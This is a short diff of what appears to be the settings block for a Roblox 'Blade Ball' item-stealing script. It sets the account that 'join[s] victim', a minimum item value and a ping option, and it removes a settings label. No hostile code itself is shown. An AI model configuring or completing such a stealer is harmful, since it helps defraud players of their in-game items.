@@ -1,4 +1,3 @@
-Blade Ball settings:
 _G.Username = "notfishybloxdontrade" -- user you join victim on
 _G.min_rap = 5
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
